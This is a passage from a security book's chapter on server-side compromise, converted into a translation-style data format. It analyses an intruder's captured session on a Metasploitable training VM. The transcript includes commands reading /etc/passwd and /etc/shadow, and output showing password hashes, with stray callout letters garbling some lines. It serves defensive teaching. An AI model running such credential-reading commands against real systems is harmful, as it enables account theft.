  prefs: []
  type: TYPE_NORMAL
- en: 'DST: _ _ _ _ _ _ ____'
  id: totrans-1493
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: _ __ ___ ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \'
  id: totrans-1494
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: | ''_ ` _ \ / _ \ __/ _` / __| ''_ \| |/ _ \| | __/ _` | ''_ \| |/ _ \
    __) |'
  id: totrans-1495
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: | | | | | | __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | | __// __/'
  id: totrans-1496
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|'
  id: totrans-1497
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: |_|'
  id: totrans-1498
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Warning: Never expose this VM to an untrusted network!'
  id: totrans-1499
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Contact: msfdev[at]metasploit.com'
  id: totrans-1500
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Login with msfadmin/msfadmin to get startedz'
  id: totrans-1501
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC'
  id: totrans-1502
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: hostname{;echo SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ'
  id: totrans-1503
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: metasploitable'
  id: totrans-1504
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ'
  id: totrans-1505
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-8: Victim enumeration*'
  id: totrans-1506
  prefs: []
  type: TYPE_NORMAL
- en: The intruder, or his script, enumerates various aspects of the victim
  id: totrans-1507
  prefs: []
  type: TYPE_NORMAL
- en: system. He begins with the dmidecode command u to learn more about the
  id: totrans-1508
  prefs: []
  type: TYPE_NORMAL
- en: platform itself. Next, he retrieves a directory listing of */etc* v, where many
    key system configuration files reside. Using the uname command w, he discovers
    which kernel version x the system is running. Displaying the con-
  id: totrans-1509
  prefs: []
  type: TYPE_NORMAL
- en: tents of the *issue* file shows text that appears after a user logs in z. Finally,
    the intruder reads the victim’s hostname {. The host system is running
  id: totrans-1510
  prefs: []
  type: TYPE_NORMAL
- en: a Linux distribution called Metasploitable, which is a tool used to learn
  id: totrans-1511
  prefs: []
  type: TYPE_NORMAL
- en: digital attack and defense, developed by the Metasploit team at Rapid7
  id: totrans-1512
  prefs: []
  type: TYPE_NORMAL
- en: ( *http://sourceforge.net/projects/metasploitable/files/Metasploitable2/*).
    Defenders use Metasploitable for training when performing security assessments
  id: totrans-1513
  prefs: []
  type: TYPE_NORMAL
- en: because Metasploitable has nothing but vulnerabilities—making it perfect
  id: totrans-1514
  prefs: []
  type: TYPE_NORMAL
- en: for anyone who wants to test the effectiveness of detection systems.
  id: totrans-1515
  prefs: []
  type: TYPE_NORMAL
- en: Apparently someone working at Vivian’s Pets downloaded Metasploitable,
  id: totrans-1516
  prefs: []
  type: TYPE_NORMAL
- en: installed it on the test network, and left it exposed to the Internet. An intruder
  id: totrans-1517
  prefs: []
  type: TYPE_NORMAL
- en: from IP address 203.0.113.10 found the computer, exploited the vulnerable
  id: totrans-1518
  prefs: []
  type: TYPE_NORMAL
- en: vsftpd server on it, and enumerated key aspects of the computer.
  id: totrans-1519
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **221**
  id: totrans-1520
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1521
  prefs: []
  type: TYPE_NORMAL
- en: '**accessing Credentials**'
  id: totrans-1522
  prefs: []
  type: TYPE_NORMAL
- en: In the last part of the transcript, the intruder turns to files where user cre-
  id: totrans-1523
  prefs: []
  type: TYPE_NORMAL
- en: dentials are stored, as shown in Listing 10-9\.
  id: totrans-1524
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/passwd''u;echo nRVObgMSefnPCAljIfCKrtCxyxAFwbXo'
  id: totrans-1525
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1526
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: root:x:0:0:rootv:/root:/bin/bash'
  id: totrans-1527
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: daemon:x:1:1:daemon:/usr/sbin:/bin/sh'
  id: totrans-1528
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: bin:x:2:2:bin:/bin:/bin/sh'
  id: totrans-1529
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sys:x:3:3:sys:/dev:/bin/sh'
  id: totrans-1530
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sync:x:4:65534:sync:/bin:/bin/sync'
  id: totrans-1531
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-1532
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1533
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: nRVObgMSefnPCAljIfCKrtCxyxAFwbXo'
  id: totrans-1534
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/shadoww'';echo YMIULmTNrfStudFPMoeddbhSAwYHGUKY'
  id: totrans-1535
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::x'
  id: totrans-1536
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: daemon:*:14684:0:99999:7:::'
  id: totrans-1537
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: bin:*:14684:0:99999:7:::'
  id: totrans-1538
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::'
  id: totrans-1539
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: sync:*:14684:0:99999:7:::'
  id: totrans-1540
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-1541
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1542
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: CKNszVzdeRiiApmbrdHsuAolRXRtIFfF'
  id: totrans-1543
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ping -c 1 www.google.comy'
  id: totrans-1544
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1545
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: pwd'
  id: totrans-1546
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1547
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ping: unknown host www.google.comz'
  id: totrans-1548
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1549
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-9: Viewing the* /etc passwd *and* /etc/shadow *files*'
  id: totrans-1550
  prefs: []
  type: TYPE_NORMAL
- en: In the final part of the transcript, the intruder displays the contents of
  id: totrans-1551
  prefs: []
  type: TYPE_NORMAL
- en: 'two key system files: */etc/passwd* u and */etc/shadow* w. The */etc/passwd*
    file contains information about users, such as root v, and the */etc/shadow* file
    stores hashes of the users’ passwords x. The transcript ends with the intruder
    or his'
  id: totrans-1552
  prefs: []
  type: TYPE_NORMAL
- en: script trying to ping *www.google.com* y, which fails z.
  id: totrans-1553
  prefs: []
  type: TYPE_NORMAL
- en: It is disturbing to see the intruder list the */etc/passwd* and */etc/shadow*
    files containing usernames and hashed passwords for the system. If he breaks
  id: totrans-1554
  prefs: []
  type: TYPE_NORMAL
